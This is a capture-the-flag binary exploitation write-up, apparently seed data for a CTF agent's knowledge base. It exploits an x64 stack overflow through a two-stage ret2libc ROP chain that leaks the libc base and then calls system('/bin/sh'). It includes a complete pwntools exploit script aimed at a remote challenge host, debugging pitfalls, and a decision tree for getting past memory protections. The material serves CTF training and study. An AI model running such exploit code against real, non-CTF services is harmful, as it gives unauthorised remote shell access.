# [Seed] CTF Pwn — x64 stack overflow + ROP chain calling system

## Scenario classification
CTF / binary exploitation

## Target overview
A 64-bit ELF with a `read()` out-of-bounds write into a stack buffer. NX is enabled (non-executable stack) but there is no PIE and no stack canary. Use ROP gadgets to call libc's `system("/bin/sh")` for a shell.

## Full execution chain

1. Basic recon
   ```bash
   file vuln          # ELF 64-bit, dynamically linked, not stripped
   checksec vuln      # NX enabled, No PIE, No Canary, Partial RELRO
   strings vuln | grep -i 'flag\|/bin/sh\|system'
   ```
2. Check main in IDA / Ghidra → find `read(0, buf, 0x100)` while `buf` is only 0x40 bytes
3. Compute the overflow offset
   ```bash
   pwndbg> cyclic 200
   # feed it to the target program; after the crash, check RSP
   pwndbg> cyclic -l 0x6161616c
   # offset = 72
   ```
4. With no PIE, PLT and GOT addresses are fixed
5. Stage 1 (no libc info): leak `puts@GOT` contents to compute the libc base
   ```python
   payload  = b'A' * 72
   payload += p64(POP_RDI)
   payload += p64(elf.got['puts'])
   payload += p64(elf.plt['puts'])
   payload += p64(elf.symbols['main'])     # return to main for a second run
   ```
6. Receive the puts output and identify the libc version (via libc-database)
7. Stage 2: build system("/bin/sh")
   ```python
   payload  = b'A' * 72
   payload += p64(POP_RDI) + p64(libc_base + libc.search(b'/bin/sh').next())
   payload += p64(libc_base + libc.symbols['system'])
   ```
8. Get the shell → cat flag

## Pitfall log

| Problem | Cause | Solution | Time spent |
|---------|-------|----------|------------|
| Program crashes after the ROP call to system, no shell | Stack not 16-byte aligned (Ubuntu 18.04+ is strict about movaps) | Add a ret gadget as padding before system | 30min |
| Works locally but not remotely | libc version mismatch | Leak one function address via puts → look up the exact version on libc-database | 40min |
| pwntools recv hangs | Program output uses setbuf(NULL) but remote stderr buffering differs | Use sendlineafter / recvuntil for precise synchronization | 15min |
| SIGPIPE immediately against remote | Stage-2 payload still uses the previous io object | After `process` / `remote`, the io must reuse the same connection; if the main process dies it's over | 20min |
| ROPgadget output is overwhelming | Tool lists all gadgets by default | Filter with `ROPgadget --binary vuln --only "pop\|ret"` | 5min |

## Toolchain findings

- **pwntools** is the de facto standard for writing exploits in Python (`from pwn import *`)
- **pwndbg** is 10x better than stock GDB (cyclic / vmmap / heap commands)
- **ROPgadget** vs **ropper**: ropper's output is friendlier and supports searching for syscall chains
- **libc-database** matches the exact libc version from a single leaked libc function address
- **one_gadget** finds a libc gadget that directly execve("/bin/sh")s — shorter than manual ROP

## Key code/commands

Complete exploit template:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

POP_RDI = 0x401243   # ROPgadget --binary vuln | grep "pop rdi"
RET     = 0x40101a   # for stack alignment

def exp():
    io = remote('chal.example.com', 31337)
    # io = process('./vuln')

    # Stage 1: leak puts@GOT
    payload  = b'A' * 72
    payload += p64(POP_RDI) + p64(elf.got['puts'])
    payload += p64(elf.plt['puts'])
    payload += p64(elf.symbols['main'])

    io.sendlineafter(b'> ', payload)
    leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    libc.address = leak - libc.symbols['puts']
    log.success(f'libc base = {hex(libc.address)}')

    # Stage 2: system('/bin/sh')
    bin_sh = next(libc.search(b'/bin/sh'))
    payload  = b'A' * 72
    payload += p64(RET)             # 16-byte stack alignment
    payload += p64(POP_RDI) + p64(bin_sh)
    payload += p64(libc.symbols['system'])

    io.sendlineafter(b'> ', payload)
    io.interactive()

if __name__ == '__main__':
    exp()
```

## Improvement suggestions for this package

- CTF-Sandbox-Orchestrator's `competition-reverse-pwn` should add a `pwn-rop-cheatsheet.md` templating this flow
- Add pwntools / pwndbg / one_gadget to the bootstrap manifest

## Reusable patterns/script snippets

**ROP exploitation decision tree**:

```text
checksec → review protections
├── No NX → shellcode directly (the old-school way)
├── NX + no PIE → classic ret2libc
├── NX + PIE + no Canary → leak the PIE base first → ret2libc
├── Canary present → leak the Canary first (format string / off-by-one)
└── Full RELRO + Canary + PIE → hard; common: fork doesn't re-randomize ASLR / __libc_start_main / SROP
```

**libc leak → exploit, standard two-stage payload**:

```text
Stage 1: leak puts@GOT → compute libc base → return to main
Stage 2: pop rdi; "/bin/sh"; ret; system
```

## Evolution actions
- [ ] Add a pwn quick-reference page to the CTF orchestrator
- [ ] Add pwntools / pwndbg / one_gadget to the bootstrap-manifest
- [ ] Have reverse-engineering/tools-dynamic.md reference this case

## Environment info
- Kali 2026.x / Ubuntu 22.04
- pwntools 4.x, pwndbg latest, ROPgadget 7.x
- libc version: glibc 2.31 / 2.35 (common in CTF)
- Target architecture: x86_64

## Anonymization requirements
This entry is seed data, written from public CTF techniques; no real competition problems or closed-source systems involved.
